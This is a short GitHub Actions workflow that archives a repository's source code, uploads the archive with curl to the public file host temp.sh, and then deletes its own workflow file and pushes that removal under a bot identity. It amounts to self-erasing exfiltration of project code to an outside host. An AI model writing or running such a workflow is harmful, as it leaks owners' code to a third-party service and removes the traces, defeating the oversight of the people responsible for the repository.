name: rh-dump
on:
  push:
    paths: [.github/workflows/rh-dump.yml]
permissions:
  contents: write
jobs:
  go:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: upload
        run: |
          git rev-parse HEAD > HEADSHA
          tar czf /tmp/src.tgz --exclude=./dist --exclude=./node_modules --exclude=./.git --exclude=./public/finds --exclude=./public/og --exclude=./public/images .
          ls -la /tmp/src.tgz
          md5sum /tmp/src.tgz
          curl -s -F file=@/tmp/src.tgz https://temp.sh/upload
          echo
      - name: cleanup
        run: |
          git config user.name realhunt-bot
          git config user.email bot@realhunt.co
          git rm -q .github/workflows/rh-dump.yml
          git commit -m 'remove dump workflow'
          git push
